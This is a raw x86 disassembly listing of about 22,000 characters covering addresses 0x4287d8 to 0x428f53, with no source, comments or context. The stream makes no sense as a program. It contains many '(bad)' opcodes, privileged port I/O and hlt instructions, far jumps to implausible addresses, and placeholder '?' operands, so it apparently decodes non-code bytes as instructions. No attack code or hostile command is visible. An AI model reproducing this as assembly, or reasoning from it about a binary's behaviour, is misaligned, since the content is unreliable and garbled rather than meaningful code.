  4287d8:	mov    DWORD PTR [ebx],edi
  4287da:	fmul   QWORD PTR [edi]
  4287dc:	dec    ebp
  4287dd:	jnp    0x428812
  4287df:	add    BYTE PTR [ebx],al
  4287e1:	mov    ecx,DWORD PTR [esp+edi*8]
  4287e4:	inc    ebp
  4287e5:	dec    ebp
  4287e6:	lea    esi,[ebx]
  4287e8:	add    DWORD PTR [ebx],eax
  4287ea:	jb     0x428827
  4287ec:	add    BYTE PTR [edi],cl
  4287ee:	inc    ebp
  4287ef:	imul   eax,edi,0x858bd800
  4287f5:	cld    
  4287f6:	clc    
  4287f7:	mov    DWORD PTR [ebp+0x0],eax
  4287fa:	inc    DWORD PTR [eax]
  4287fc:	or     al,0xde
  4287fe:	sbb    bh,0x1
  428801:	retf   
  428802:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428809:	dec    ebp
  42880a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428810:	enter  0x12de,0xdf
  428814:	inc    ebp
  428815:	pop    ebp
  428816:	dec    DWORD PTR [ebx-0x257f0ff4]
  42881c:	add    DWORD PTR [edx],edx
  42881e:	add    BYTE PTR [ebp+0x50],dl
  428821:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428827:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  42882d:	or     ah,al
  42882f:	pop    ss
  428830:	cdq    
  428831:	push   ebp
  428832:	clc    
  428833:	mov    eax,DWORD PTR [ebp-0x4]
  428836:	xor    edx,edx
  428838:	add    esi,DWORD PTR [ebx]
  42883a:	cmp    eax,DWORD PTR [ebx]
  42883c:	hlt    
  42883d:	cmp    DWORD PTR [ebx],esp
  42883f:	or     al,BYTE PTR [ebp+0xf]
  428842:	mov    eax,DWORD PTR [edx]
  428844:	loopne 0x428846
  428846:	(bad)  
  428847:	mov    ecx,esi
  428849:	cld    
  42884a:	pushf  
  42884b:	pop    ebp
  42884c:	cwde   
  42884d:	mov    esi,DWORD PTR [edx]
  42884f:	lock mov eax,eax
  428852:	adc    BYTE PTR [ebx],al
  428854:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42885b:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428861:	dec    ebp
  428862:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428868:	(bad)  
  428869:	iret   
  42886a:	inc    ebp
  42886b:	(bad)  
  42886c:	jne    0x4288bb
  42886e:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428874:	(bad)  
  428875:	cmp    ebx,eax
  428877:	je     0x4287ff
  428879:	add    edi,edi
  42887b:	or     bh,bh
  42887d:	dec    ebp
  42887e:	inc    ebp
  42887f:	mov    esi,DWORD PTR [ebx]
  428881:	cld    
  428882:	add    ecx,esi
  428884:	cmp    ecx,DWORD PTR [eax-0xc]
  428887:	mov    edx,DWORD PTR [edi]
  428889:	or     BYTE PTR [ebp-0x7c],al
  42888c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428892:	test   BYTE PTR [eax+ebx*4],cl
  428895:	inc    ebp
  428896:	xor    bh,BYTE PTR ds:0x8be89c89
  42889c:	out    dx,eax
  42889d:	adc    BYTE PTR [eax],al
  42889f:	jne    0x428868
  4288a1:	mov    ebp,esp
  4288a3:	fcomp  DWORD PTR [ebx]
  4288a5:	add    BYTE PTR [ecx],al
  4288a7:	inc    DWORD PTR [ebp-0x75]
  4288aa:	mov    ?,esp
  4288ac:	add    al,0xce
  4288ae:	mov    ecx,edi
  4288b0:	cld    
  4288b1:	inc    ebp
  4288b2:	fidivr WORD PTR [ebx]
  4288b4:	fbstp  TBYTE PTR [ebp-0x3e]
  4288b7:	mov    eax,DWORD PTR [eax]
  4288b9:	adc    BYTE PTR [ebx-0x3974038b],cl
  4288bf:	fadd   st,st(7)
  4288c1:	add    BYTE PTR [ebp-0x1],al
  4288c4:	mov    ecx,DWORD PTR [esp+edi*8]
  4288c7:	inc    ebp
  4288c8:	mov    bh,0xc7
  4288cb:	loopne 0x428912
  4288cd:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  4288d3:	add    DWORD PTR [ebx],esi
  4288d5:	pushf  
  4288d6:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  4288dc:	mov    eax,edi
  4288de:	cwde   
  4288df:	inc    ebp
  4288e0:	inc    ebp
  4288e1:	jne    0x42886e
  4288e3:	mov    esp,esp
  4288e5:	clc    
  4288e6:	add    al,0x4d
  4288e8:	mov    DWORD PTR [ebx],esi
  4288ea:	or     al,0x33
  4288ec:	inc    ebp
  4288ed:	lea    ecx,[ebx-0x398d13fd]
  4288f3:	add    bh,al
  4288f5:	inc    ebp
  4288f6:	ror    DWORD PTR [ebx+0x45d829],0x8b
  4288fd:	add    ebp,esp
  4288ff:	shufps xmm1,xmm3,0xc7
  428903:	(bad)  
  428904:	jmp    0x7487c42d
  428909:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  42890f:	hlt    
  428910:	mov    ecx,DWORD PTR [edi]
  428912:	fadd   DWORD PTR [ebp+0x0]
  428915:	xor    ecx,DWORD PTR [edi]
  428917:	add    ecx,ecx
  428919:	cmp    edi,edi
  42891b:	pmuludq mm7,QWORD PTR [edx+0x50]
  42891f:	(bad)  
  428920:	jmp    0x4288ad
  428922:	mov    edi,esp
  428924:	or     al,0xc6
  428926:	inc    ebp
  428927:	(bad)  
  428928:	mov    eax,DWORD PTR [ebp+0x10]
  42892b:	jne    0x4288b6
  42892d:	mov    eax,DWORD PTR [ecx]
  42892f:	clc    
  428930:	add    BYTE PTR [ebp-0x40],cl
  428933:	xor    edx,DWORD PTR [eax-0x73]
  428936:	jne    0x428939
  428938:	push   DWORD PTR [edx+0x8]
  42893b:	add    BYTE PTR [ebp+0x45],al
  42893e:	mov    ebp,ecx
  428940:	cld    
  428941:	add    BYTE PTR [ebp+0x0],cl
  428944:	xor    eax,DWORD PTR [ebp+0x3]
  428947:	mov    al,0x3b
  428949:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42894f:	sub    eax,0x5d330e4d
  428954:	lea    esi,[ebx]
  428956:	add    DWORD PTR [ebx],eax
  428958:	jb     0x428943
  42895a:	add    BYTE PTR [eax],al
  42895c:	inc    ebp
  42895d:	add    bl,ch
  42895f:	inc    ebp
  428960:	mov    esi,DWORD PTR [ebx]
  428962:	or     al,0x3
  428964:	(bad)  
  428965:	mov    edi,eax
  428967:	in     al,dx
  428968:	scas   eax,DWORD PTR es:[edi]
  428969:	inc    ebp
  42896a:	mov    esi,DWORD PTR [ebx]
  42896c:	in     al,0x3
  42896e:	add    al,0x89
  428970:	mov    ecx,DWORD PTR [eax+edi*8]
  428973:	dec    ebp
  428974:	(bad)  
  428975:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  42897c:	mov    ecx,eax
  42897e:	cld    
  42897f:	push   es
  428980:	dec    ebp
  428981:	add    al,0x33
  428983:	mov    DWORD PTR [ebx],eax
  428985:	in     al,dx
  428986:	cmp    DWORD PTR [ebp-0x67],eax
  428989:	mov    eax,DWORD PTR [ebp-0xba0068]
  42898f:	mov    edx,DWORD PTR [ebp-0x4]
  428992:	mov    ecx,DWORD PTR [ebp-0x18]
  428995:	xor    ecx,DWORD PTR [ebp+0x3]
  428998:	cmp    DWORD PTR [ebx],0x8b327497
  42899e:	xor    edi,esp
  4289a0:	jmp    0xff7686f2
  4289a5:	add    ecx,DWORD PTR [ebp-0x3f]
  4289a8:	xor    ebx,DWORD PTR [edi]
  4289aa:	add    eax,ecx
  4289ac:	cmp    ebx,DWORD PTR [eax]
  4289ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4289b1:	mov    ecx,DWORD PTR [eax]
  4289b3:	adc    BYTE PTR [ebp-0x80],al
  4289b6:	jmp    0x4289b9
  4289b8:	mov    eax,DWORD PTR [eax]
  4289ba:	cld    
  4289bb:	mov    bh,0xc6
  4289bd:	push   ecx
  4289be:	(bad)  
  4289bf:	jne    0x428a1f
  4289c1:	dec    ecx
  4289c3:	or     BYTE PTR [ecx+ebx*1],cl
  4289c6:	push   ebp
  4289c7:	inc    ebp
  4289c8:	in     al,dx
  4289c9:	add    ebp,esp
  4289cb:	or     bh,al
  4289cd:	dec    ebp
  4289ce:	cld    
  4289cf:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  4289d5:	cmp    DWORD PTR [ecx],0x2
  4289d8:	pushf  
  4289d9:	dec    DWORD PTR [ebx+0x45510cf4]
  4289df:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  4289e5:	mov    edx,DWORD PTR [ecx+0xc]
  4289e8:	xor    eax,esi
  4289ea:	mov    edx,0xc172c7
  4289ef:	inc    ebp
  4289f0:	mov    esi,DWORD PTR [ebp+0x8]
  4289f3:	mov    eax,edx
  4289f5:	call   0x84c750ea
  4289fa:	add    DWORD PTR [eax-0x76bace00],ebx
  428a00:	mov    ebp,eax
  428a02:	or     BYTE PTR [eax],dl
  428a04:	jo     0x428a53
  428a06:	push   edi
  428a07:	xor    esi,DWORD PTR [ebp+0x3]
  428a0a:	(bad)  
  428a0b:	pmulhuw mm0,mm1
  428a0e:	test   DWORD PTR [ebp-0x8],ecx
  428a11:	mov    DWORD PTR [ebp-0x67],eax
  428a14:	mov    eax,DWORD PTR [ebp-0x4]
  428a17:	xor    edi,DWORD PTR [ebp-0x73]
  428a1a:	xor    eax,DWORD PTR [ebx]
  428a1c:	xor    esi,DWORD PTR [edx+0x3]
  428a1f:	add    BYTE PTR [ecx],bh
  428a21:	inc    ebp
  428a22:	(bad)  
  428a23:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428a29:	mov    DWORD PTR [eax],0x750f0004
  428a2f:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428a35:	lock add BYTE PTR [ebp+0x0],al
  428a39:	mov    esi,DWORD PTR [ebp-0x2c]
  428a3c:	mov    ebp,edx
  428a3e:	or     al,0x72
  428a40:	ja     0x428a42
  428a42:	mov    edx,esi
  428a44:	cld    
  428a45:	(bad)  
  428a48:	cli    
  428a49:	mov    esi,DWORD PTR [ebp-0x4]
  428a4c:	cmp    ecx,esi
  428a4e:	bswap  edi
  428a50:	(bad)
  428a54:	mov    esi,DWORD PTR [ebp-0x4]
  428a57:	mov    esi,ecx
  428a59:	clc    
  428a5a:	repnz add esi,DWORD PTR [ebp+0x45]
  428a5e:	push   ebx
  428a5f:	xor    eax,DWORD PTR [ebp+0x3]
  428a62:	cmp    ebx,DWORD PTR [edi-0x64]
  428a65:	pop    ebx
  428a66:	jmp    0x428b2d
  428a6b:	mov    esi,DWORD PTR [ebp-0x7d]
  428a6e:	xor    ebp,DWORD PTR [eax]
  428a70:	lea    eax,[ebp-0x8]
  428a73:	cmp    dl,dh
  428a75:	pushf  
  428a76:	out    dx,eax
  428a77:	(bad)  
  428a78:	neg    eax
  428a7a:	ins    DWORD PTR es:[edi],dx
  428a7b:	test   esi,edi
  428a7d:	clc    
  428a7e:	pop    esp
  428a7f:	inc    ebp
  428a80:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428a86:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428a8c:	add    cl,al
  428a8e:	jne    0x428a28
  428a90:	mov    esi,DWORD PTR [edx]
  428a92:	in     al,dx
  428a93:	push   esi
  428a94:	xor    BYTE PTR [ebp-0xe],dh
  428a97:	add    edi,esi
  428a99:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428a9f:	add    cl,bh
  428aa1:	mov    edi,DWORD PTR [ebp+0x8]
  428aa4:	mov    DWORD PTR [ebp-0x14],esi
  428aa7:	add    esi,DWORD PTR [ebp+0x3c]
  428aaa:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428ab0:	mov    ah,0x3d
  428ab2:	cwde   
  428ab3:	pushf  
  428ab4:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428aba:	jne    0x428a47
  428abc:	mov    ecx,DWORD PTR [esp+ebp*8]
  428abf:	icebp  
  428ac0:	icebp  
  428ac1:	shl    edx,0xf2
  428ac4:	(bad)  
  428ac5:	mov    ah,0x16
  428ac7:	cmp    BYTE PTR [ebp-0x6d],dh
  428aca:	mov    ecx,DWORD PTR [edi]
  428acc:	in     al,dx
  428acd:	jmp    0x428ac0
  428acf:	add    dl,dh
  428ad1:	mov    edi,esi
  428ad3:	or     al,0x8
  428ad5:	inc    ebp
  428ad6:	jne    0x428adb
  428ad8:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428ade:	ret    
  428adf:	or     bh,bh
  428ae1:	jge    0x428acb
  428ae3:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428ae9:	xor    edi,eax
  428aeb:	add    esi,DWORD PTR [ebp-0x77]
  428aee:	mov    ebx,esp
  428af0:	clc    
  428af1:	neg    DWORD PTR [ebp-0x7c]
  428af4:	xor    eax,DWORD PTR [eax]
  428af6:	cmp    eax,DWORD PTR [eax]
  428af8:	repz jne 0x428a90
  428afb:	xor    eax,DWORD PTR [ecx]
  428afd:	add    ebx,DWORD PTR [eax]
  428aff:	mov    DWORD PTR [ebp-0x8],eax
  428b02:	mov    eax,edi
  428b04:	cld    
  428b05:	lock pop eax
  428b07:	test   DWORD PTR [ebx],esi
  428b09:	clc    
  428b0a:	add    edx,DWORD PTR [edi-0x740bff77]
  428b10:	fdivp  st(4),st
  428b12:	test   ecx,esi
  428b14:	(bad)  
  428b15:	jnp    0x428b16
  428b17:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428b1d:	jae    0x428aaa
  428b1f:	sub    edi,esp
  428b21:	(bad)  
  428b22:	shl    DWORD PTR [eax-0x3e],0x89
  428b26:	leave  
  428b27:	call   0x81984234
  428b2c:	in     al,dx
  428b2d:	(bad)  
  428b2e:	in     al,dx
  428b2f:	add    bh,al
  428b31:	mov    esp,edi
  428b33:	in     al,dx
  428b34:	test   DWORD PTR [ebp-0x8],edi
  428b37:	mov    eax,DWORD PTR [ebp+0x2b]
  428b3a:	cmp    DWORD PTR [ebx],eax
  428b3c:	pushf  
  428b3d:	jnp    0x57318776
  428b43:	xor    edx,DWORD PTR [eax-0x77]
  428b46:	push   ecx
  428b47:	loopne 0x428b7c
  428b49:	jne    0x428b06
  428b4b:	mov    esi,DWORD PTR [edx-0x20]
  428b4e:	add    BYTE PTR [ebp-0x3d],bh
  428b51:	xor    eax,DWORD PTR [ebp-0x73]
  428b54:	mov    edi,DWORD PTR [esi]
  428b56:	cld    
  428b57:	jb     0x428b1f
  428b59:	add    bl,al
  428b5b:	jne    0x428ba2
  428b5d:	mov    edx,DWORD PTR [edi-0x10]
  428b60:	jge    0x428bdf
  428b62:	mov    esi,DWORD PTR [ebx]
  428b64:	lock add ecx,DWORD PTR [ebp+0x3b]
  428b68:	xor    esi,DWORD PTR [ebp-0x77]
  428b6b:	mov    esi,eax
  428b6d:	lock inc ebp
  428b6f:	jge    0x428ba9
  428b71:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428b78:	dec    ebp
  428b79:	mov    esi,DWORD PTR [ebx]
  428b7b:	loopne 0x428b06
  428b7d:	jge    0x428b77
  428b7f:	add    DWORD PTR [ebp-0x7d],eax
  428b82:	clc    
  428b83:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  428b8a:	dec    ebp
  428b8b:	hlt    
  428b8c:	xor    ebx,DWORD PTR [ebp-0x77]
  428b8f:	mov    esi,esp
  428b91:	in     al,0x45
  428b93:	jge    0x428bd1
  428b95:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  428b9c:	dec    ebp
  428b9d:	cmp    al,0x33
  428b9f:	xchg   ebx,eax
  428ba0:	mov    DWORD PTR [ebx-0x14],esi
  428ba3:	add    eax,DWORD PTR [ebp-0xc]
  428ba6:	cmp    BYTE PTR [ebp-0x61],dh
  428ba9:	mov    edi,DWORD PTR [eax+0xf19504]
  428baf:	repnz mov DWORD PTR [ebp+0x20],ebx
  428bb3:	cmp    eax,DWORD PTR [ebp+0xf]
  428bb6:	test   DWORD PTR [edi+ecx*1-0x1],edx
  428bba:	fistp  WORD PTR [ebx+0x0]
  428bbd:	inc    ebp
  428bbe:	mov    ebx,DWORD PTR [edi+0xc]
  428bc1:	add    eax,eax
  428bc3:	inc    ebp
  428bc4:	test   BYTE PTR [ebx],dh
  428bc6:	add    eax,DWORD PTR [ebx]
  428bc8:	add    BYTE PTR [esi+0x45],bl
  428bcb:	ret    0x85
  428bce:	jnp    0x54430f9d
  428bd4:	inc    bp
  428bd6:	inc    ebp
  428bd7:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  428bdd:	fdiv   QWORD PTR [ebx]
  428bdf:	test   DWORD PTR [ecx+0x453af8],edi
  428be5:	push   ebx
  428be6:	add    edi,DWORD PTR [esi+0x708088b]
  428bec:	cmp    esi,eax
  428bee:	sets   BYTE PTR [ecx-0x74fcffce]
  428bf5:	mov    esp,edi
  428bf7:	call   0x33cdd149
  428bfc:	or     BYTE PTR [ebx],al
  428bfe:	inc    ecx
  428bff:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  428c05:	and    BYTE PTR [ebp-0x7074f0bb],al
  428c0b:	lock add cl,al
  428c0e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  428c15:	mov    ch,0x45
  428c17:	clc    
  428c18:	xor    eax,DWORD PTR [ebp+0x3]
  428c1b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  428c21:	inc    ebp
  428c22:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  428c28:	mov    edi,eax
  428c2a:	mov    eax,DWORD PTR [ebp+0x3c]
  428c2d:	mov    ecx,DWORD PTR [eax]
  428c2f:	hlt    
  428c30:	inc    ebp
  428c31:	ror    DWORD PTR [ebx+0x818c45],0xf4
  428c38:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  428c3e:	push   ebp
  428c3f:	mov    edi,DWORD PTR [ebx]
  428c41:	in     al,dx
  428c42:	jne    0x428c05
  428c44:	mov    eax,DWORD PTR [ebp-0x28]
  428c47:	add    DWORD PTR [eax],0xe8058dec
  428c4d:	clc    
  428c4e:	mov    esp,DWORD PTR [edi-0x8]
  428c51:	add    dh,dl
  428c53:	rol    WORD PTR [ebp-0x1],cl
  428c57:	mov    edx,DWORD PTR [eax+0x8]
  428c5a:	jne    0x428c1c
  428c5c:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  428c63:	inc    ebp
  428c64:	push   esp
  428c65:	test   DWORD PTR [ecx+0xf],ecx
  428c68:	sub    edx,esp
  428c6a:	add    eax,DWORD PTR [eax]
  428c6c:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  428c72:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  428c79:	mov    eax,DWORD PTR [ecx]
  428c7b:	and    BYTE PTR [eax],al
  428c7d:	adc    BYTE PTR ss:[eax],al
  428c80:	inc    ebp
  428c81:	inc    cx
  428c84:	push   esp
  428c85:	cld    
  428c86:	jne    0x428c88
  428c88:	push   edx
  428c89:	enterw 0xc1,0x4d
  428c8e:	mov    esp,DWORD PTR [esi+0x20]
  428c91:	add    DWORD PTR [ecx-0x7b],eax
  428c94:	add    eax,DWORD PTR [ebx]
  428c96:	str    WORD PTR [eax+0x45]
  428c9a:	lea    ecx,[ebx+0x45890801]
  428ca0:	sbb    BYTE PTR [ebx],al
  428ca2:	dec    ebp
  428ca3:	cmp    al,0xf
  428ca5:	inc    ebp
  428ca6:	push   eax
  428ca7:	mov    esi,DWORD PTR [ebx]
  428ca9:	push   eax
  428caa:	add    eax,eax
  428cac:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  428cb3:	inc    ebp
  428cb4:	add    BYTE PTR [eax],bh
  428cb6:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  428cbd:	(bad)  
  428cbe:	mov    ebx,eax
  428cc0:	loopne 0x428d07
  428cc2:	dec    ebp
  428cc3:	mov    ecx,DWORD PTR [edi]
  428cc5:	cld    
  428cc6:	push   eax
  428cc7:	xchg   DWORD PTR [ebx],esi
  428cc9:	add    DWORD PTR [ebx],ebp
  428ccb:	add    BYTE PTR [ebx],ch
  428ccd:	or     BYTE PTR [ecx],bh
  428ccf:	dec    ecx
  428cd0:	loopne 0x428cd5
  428cd2:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  428cd8:	push   ebp
  428cd9:	add    DWORD PTR [ebx+0x55100800],eax
  428cdf:	dec    ebp
  428ce0:	jmp    0x428c6b
  428ce2:	mov    esp,DWORD PTR [eax]
  428ce4:	sbb    dl,dl
  428ce6:	inc    eax
  428ce7:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  428ced:	add    BYTE PTR [ebx+0x74528555],cl
  428cf3:	push   ebp
  428cf4:	div    DWORD PTR [ebx]
  428cf6:	and    eax,DWORD PTR [ebx]
  428cf8:	add    edx,DWORD PTR [edx-0x30]
  428cfb:	jno    0x428c88
  428cfd:	inc    DWORD PTR [eax+eiz*1]
  428d00:	inc    ebp
  428d01:	push   eax
  428d02:	push   eax
  428d03:	mov    esp,DWORD PTR [edi-0x74beff1c]
  428d09:	mov    edi,esp
  428d0b:	push   eax
  428d0c:	inc    ebp
  428d0d:	enter  0x458b,0x8
  428d11:	push   ecx
  428d12:	(bad)  
  428d13:	call   0x10c96eb
  428d18:	pop    ss
  428d19:	push   ebp
  428d1a:	mov    ecx,DWORD PTR [ebx+0x489408]
  428d20:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  428d26:	push   ecx
  428d27:	jo     0x428d11
  428d29:	inc    DWORD PTR [edi]
  428d2b:	or     BYTE PTR [eax],al
  428d2d:	call   0xcd9477
  428d32:	fmul   QWORD PTR [ebp+0x55]
  428d35:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  428d3b:	mov    bh,0x8c
  428d3d:	adc    al,0x98
  428d3f:	dec    esp
  428d40:	xor    bl,BYTE PTR [eax]
  428d42:	mov    ecx,DWORD PTR [ebp+0xc]
  428d45:	mov    eax,DWORD PTR [ebp-0x4]
  428d48:	mov    esi,DWORD PTR [edi-0x3148f924]
  428d4e:	push   es
  428d4f:	retf   
  428d50:	mov    BYTE PTR [ebp-0x30],0x3b
  428d54:	inc    ebp
  428d55:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  428d5c:	retf   0x83fc
  428d5f:	into   
  428d60:	dec    ebp
  428d61:	retf   
  428d62:	mov    ecx,DWORD PTR [ebp-0x74]
  428d65:	mov    eax,DWORD PTR [eax]
  428d67:	fdiv   QWORD PTR [ebx]
  428d69:	mov    bh,0x3
  428d6b:	push   es
  428d6c:	mov    esi,ecx
  428d6e:	sbb    cl,dl
  428d70:	dec    ebp
  428d71:	sar    DWORD PTR [ebx],cl
  428d73:	push   ebp
  428d74:	jne    0x428d85
  428d76:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  428d7c:	lea    ebx,[eax]
  428d7e:	call   0xf4cc1945
  428d83:	sbb    dh,dl
  428d85:	add    edx,ebx
  428d87:	push   ebp
  428d88:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  428d8e:	push   ecx
  428d8f:	mov    DWORD PTR [eax-0x30],edx
  428d92:	test   DWORD PTR [edx],eax
  428d94:	xadd   esp,esi
  428d97:	pop    es
  428d98:	add    cl,dl
  428d9a:	mov    eax,ecx
  428d9c:	or     al,0x45
  428d9e:	(bad)  
  428d9f:	push   eax
  428da0:	add    DWORD PTR [edx+0x0],eax
  428da3:	add    ecx,DWORD PTR [ecx]
  428da5:	and    dh,cl
  428da7:	call   0xc69677
  428dac:	add    DWORD PTR [ebp+0x0],edx
  428daf:	mov    esp,DWORD PTR [ebp+0x18]
  428db2:	add    BYTE PTR [eax+0x44],cl
  428db5:	xor    eax,DWORD PTR [eax]
  428db7:	add    esp,DWORD PTR [esi+0x3b]
  428dba:	inc    ebp
  428dbb:	je     0x428d40
  428dbd:	push   ecx
  428dbe:	or     cl,BYTE PTR [ebp-0x77]
  428dc1:	add    eax,esi
  428dc3:	or     al,0x5e
  428dc5:	inc    eax
  428dc6:	add    BYTE PTR [ebx],al
  428dc8:	data16 and BYTE PTR [ebp+0x50],al
  428dcc:	sub    DWORD PTR [ecx],0xffffffe8
  428dcf:	add    BYTE PTR [ebp-0x75],ah
  428dd2:	add    BYTE PTR [eax],bl
  428dd4:	enter  0x894d,0x8b
  428dd8:	int3   
  428dd9:	loopne 0x428e0d
  428ddb:	rol    BYTE PTR [eax],0x33
  428dde:	lea    cx,[ebp+0xa]
  428de2:	data16 jb 0x428e2a
  428de5:	add    BYTE PTR [ebx+0x44890855],cl
  428deb:	sbb    ah,al
  428ded:	inc    ebp
  428dee:	lldt   WORD PTR ss:[edx+0x66]
  428df3:	xor    ecx,DWORD PTR [eax]
  428df5:	sub    edi,esp
  428df7:	mov    eax,DWORD PTR [eax]
  428df9:	or     al,0x66
  428dfb:	ror    edx,cl
  428dfd:	dec    ebp
  428dfe:	inc    ebp
  428dff:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  428e05:	cld    
  428e06:	or     BYTE PTR [edi+0x4501dd],dl
  428e0c:	(bad)  
  428e0d:	into   
  428e0e:	out    dx,al
  428e0f:	retf   
  428e10:	(bad)  
  428e11:	dec    ebp
  428e12:	mov    al,0x8b
  428e14:	jmp    0xea27:0x450ac320
  428e1b:	xchg   esi,ebp
  428e1d:	add    edi,eax
  428e1f:	add    BYTE PTR [eax+0x3f52e955],bh
  428e25:	push   ebp
  428e26:	inc    ebp
  428e27:	xor    ebx,esp
  428e29:	add    ebp,esi
  428e2b:	push   edx
  428e2c:	push   bp
  428e2e:	inc    ebp
  428e2f:	(bad)  
  428e30:	in     eax,dx
  428e31:	push   esp
  428e32:	(bad)  
  428e33:	inc    edx
  428e35:	sbb    al,0x33
  428e37:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  428e3e:	add    BYTE PTR [ebp+0x43],0x8b
  428e42:	jmp    0xf98b:0x100041c8
  428e49:	xor    esi,DWORD PTR [edx+0x3]
  428e4c:	mov    ecx,DWORD PTR [edi]
  428e4e:	fmul   DWORD PTR [edx]
  428e50:	add    BYTE PTR [eax],al
  428e52:	lea    eax,[ebx-0x4700273c]
  428e58:	add    al,0x4f
  428e5a:	pop    DWORD PTR [eax]
  428e5c:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  428e62:	push   edx
  428e63:	inc    WORD PTR [ebp+0x8]
  428e67:	mov    eax,0x514f4d
  428e6c:	(bad)
  428e70:	add    al,al
  428e72:	xor    DWORD PTR [ebx-0x74baf730],eax
  428e78:	test   DWORD PTR [esi+0x74],esp
  428e7b:	inc    ebp
  428e7c:	mov    DWORD PTR [eax+0xa4f08],edi
  428e82:	add    BYTE PTR [ecx-0x76c435bb],cl
  428e88:	or     dh,cl
  428e8a:	or     eax,0x8b8d5045
  428e8f:	inc    ebp
  428e90:	mov    WORD PTR [ecx+0x3b8a00],?
  428e96:	jne    0x428ecb
  428e98:	mov    edi,DWORD PTR [edx+0x8f3a18]
  428e9e:	add    DWORD PTR [ebx],eax
  428ea0:	add    bh,bh
  428ea2:	adc    DWORD PTR [eax],ecx
  428ea4:	adc    DWORD PTR [ebp+0x55],edi
  428ea7:	push   es
  428ea8:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  428eae:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  428eb5:	inc    ebp
  428eb6:	mov    esp,edi
  428eb8:	or     al,0xdc
  428eba:	push   eax
  428ebb:	(bad)  
  428ebc:	jne    0x428e72
  428ebe:	call   0x3a87af
  428ec3:	inc    ebp
  428ec4:	rol    dl,0x84
  428ec7:	out    dx,al
  428ec8:	add    bh,al
  428eca:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  428ed1:	(bad)  
  428ed2:	and    al,al
  428ed4:	fs in  eax,dx
  428ed6:	inc    DWORD PTR [ebp-0x7b]
  428ed9:	js     0x428eea
  428edb:	leave  
  428edc:	scas   al,BYTE PTR es:[edi]
  428edd:	inc    esp
  428ede:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  428ee5:	or     BYTE PTR [ebx-0x97717c5],0x83
  428eec:	call   DWORD PTR [edi]
  428eee:	shr    ah,0x84
  428ef1:	xchg   DWORD PTR [eax],eax
  428ef3:	add    DWORD PTR [eax],eax
  428ef5:	add    bh,bh
  428ef7:	dec    ebp
  428ef8:	and    BYTE PTR [ecx-0x38],dl
  428efb:	push   eax
  428efc:	dec    DWORD PTR [ebx+0xfd885]
  428f02:	mov    BYTE PTR [ebp+0x508bac00],cl
  428f08:	mov    WORD PTR [ecx+0x0],ss
  428f0b:	lea    ecx,[ebx+0x108b20d8]
  428f11:	mov    WORD PTR [edx],ds
  428f13:	add    BYTE PTR [edi+0xff01ff],al
  428f19:	mov    ecx,DWORD PTR [ebp-0x28]
  428f1c:	push   ecx
  428f1d:	shl    BYTE PTR [ebp+0x3a],0x8b
  428f21:	inc    ebp
  428f22:	in     al,0xeb
  428f24:	jno    0x428eb1
  428f26:	push   edx
  428f27:	mov    DWORD PTR [eax-0x28],edx
  428f2a:	mov    eax,DWORD PTR [ebp+0x20]
  428f2d:	je     0x428eb6
  428f2f:	mov    eax,DWORD PTR [ecx]
  428f31:	sbb    BYTE PTR [eax],al
  428f33:	pop    DWORD PTR [eax]
  428f35:	add    esi,eax
  428f37:	add    bl,al
  428f39:	adc    DWORD PTR [edi],esi
  428f3b:	jmp    0x8bcddf8d
  428f40:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  428f47:	jne    0x428ed4
  428f49:	mov    ecx,DWORD PTR [eax]
  428f4b:	in     al,0x75
  428f4d:	pop    DWORD PTR [ecx+0x5001]
  428f53:	push   edx
